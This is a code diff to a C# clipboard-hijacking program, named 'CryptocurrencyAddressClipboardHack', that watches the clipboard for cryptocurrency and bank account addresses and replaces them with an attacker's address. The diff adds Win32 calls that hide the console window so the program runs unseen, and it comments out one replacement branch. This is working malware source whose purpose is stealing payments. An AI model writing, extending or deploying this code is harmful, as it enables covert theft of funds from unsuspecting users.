@@ -2,16 +2,28 @@
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
 
 namespace CryptocurrencyAddressClipboardHack
 {
     internal class Program
     {
         static string previousClipboardText = string.Empty;
+        
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+
+        const int SW_HIDE = 0;
 
         [STAThread]
         static void Main()
         {
+            IntPtr consoleHandle = GetConsoleWindow();//run app in background
+            ShowWindow(consoleHandle, SW_HIDE);//run app in background
+
             Thread clipboardThread = new Thread(MonitorClipboard);
             clipboardThread.SetApartmentState(ApartmentState.STA);
             clipboardThread.Start();
@@ -82,8 +94,8 @@ namespace CryptocurrencyAddressClipboardHack
             }
             else if (ValidateCoinAddress(currenText, patternArgCBU))
             {
-                string personalADAAddress = "1234567890123456789012";
-                Clipboard.SetText(personalADAAddress);
+                //string personalADAAddress = "1234567890123456789012";
+                //Clipboard.SetText(personalADAAddress);
             }
         }
 
